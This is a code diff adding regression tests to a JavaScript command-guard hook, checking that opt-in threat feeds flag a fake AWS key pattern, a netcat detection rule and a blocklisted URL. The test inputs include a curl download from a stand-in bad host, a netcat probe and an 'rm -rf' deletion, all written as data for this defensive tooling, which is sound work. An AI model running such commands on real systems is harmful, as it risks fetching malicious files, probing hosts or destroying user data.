@@ -177,6 +177,63 @@ function main() {
       `decision=${decision} audit=${JSON.stringify(auditLines)}`);
   }
 
+  // Phase 6 — threat feeds (opt-in, monitor-only). A small hand-built fixture feeds dir, not live network
+  // data (that's separately live-verified and recorded in the phase archive) — kept fast and deterministic.
+  // Regression coverage for a real bug caught this session: guard-bash's inlined secrets-matcher passed a
+  // gitleaks-shaped {regex,flags} rule straight into a helper expecting {source,flags}; pattern.source came
+  // back undefined, and `new RegExp(undefined)` matches every string — every command "matched" every secret.
+  {
+    const feedsDir = fs.mkdtempSync(path.join(TEST_HOME_BASE, "feeds-"));
+    fs.writeFileSync(path.join(feedsDir, "opt-in"), new Date().toISOString());
+    const write = (name, rules) => {
+      fs.mkdirSync(path.join(feedsDir, name), { recursive: true });
+      fs.writeFileSync(path.join(feedsDir, name, "rules.json"), JSON.stringify({ rules, skipped: [] }));
+    };
+    write("secrets", [{ id: "fake-aws-key", category: "secret", severity: "high", regex: "\\bAKIA[A-Z0-9]{16}\\b", flags: "" }]);
+    write("commands", [{
+      id: "fake-nc-listener", category: "command", severity: "high",
+      sigma: { selections: { sel: [{ field: "Image", all: false, patterns: [{ source: "/nc$", flags: "i" }] }] }, condition: { t: "sel", name: "sel" } },
+    }]);
+    write("urls", [{ id: "fake-listed-url", category: "url", severity: "high", set: { urls: ["http://bad.example.invalid/x"] } }]);
+
+    const withFeeds = (cmd) => runHook(cmd, { env: { GOODBEHAVIOR_FEEDS_DIR: feedsDir } });
+
+    {
+      // same rules present on disk, but no opt-in marker -> must be a silent no-op, not an error or a hit.
+      const notOptedInDir = fs.mkdtempSync(path.join(TEST_HOME_BASE, "feeds-not-opted-in-"));
+      const write2 = (name, rules) => {
+        fs.mkdirSync(path.join(notOptedInDir, name), { recursive: true });
+        fs.writeFileSync(path.join(notOptedInDir, name, "rules.json"), JSON.stringify({ rules, skipped: [] }));
+      };
+      write2("secrets", [{ id: "fake-aws-key", category: "secret", severity: "high", regex: "\\bAKIA[A-Z0-9]{16}\\b", flags: "" }]);
+      const { auditLines } = runHook("echo AKIAABCDEFGHIJKLMNOP", { env: { GOODBEHAVIOR_FEEDS_DIR: notOptedInDir } });
+      check("feeds: rules present but no opt-in marker -> no monitor hit (opt-in gate itself works)",
+        !auditLines.some((l) => l.decision === "monitor"));
+    }
+    {
+      const { auditLines } = withFeeds("echo AKIAABCDEFGHIJKLMNOP");
+      check("feeds: matching secret is flagged monitor", auditLines.some((l) => l.decision === "monitor" && l.shape === "feed:secrets:fake-aws-key"));
+    }
+    {
+      const { auditLines, decision } = withFeeds("git status");
+      check("feeds: benign command matches NOTHING (regression: undefined regex source must not match everything)",
+        !auditLines.some((l) => l.decision === "monitor"), JSON.stringify(auditLines));
+      check("feeds: benign command's own decision is unaffected", decision === null);
+    }
+    {
+      const { auditLines } = withFeeds("nc -zv localhost 8080"); // no exec flag -> not our own hard shape
+      check("feeds: matching sigma command rule is flagged monitor", auditLines.some((l) => l.decision === "monitor" && l.shape === "feed:commands:fake-nc-listener"));
+    }
+    {
+      const { auditLines } = withFeeds("curl -o x http://bad.example.invalid/x");
+      check("feeds: matching urlhaus rule is flagged monitor", auditLines.some((l) => l.decision === "monitor" && l.shape === "feed:urls:fake-listed-url"));
+    }
+    {
+      const { auditLines, decision } = withFeeds("rm -rf ~/Downloads/tmpdir"); // gray zone -> ask, no feed match expected
+      check("feeds: a feed miss never changes the zone-ladder decision", decision === "ask" && !auditLines.some((l) => l.decision === "monitor"));
+    }
+  }
+
   console.log(`test_guard: ${total - failures}/${total} passed`);
   return failures ? 1 : 0;
 }
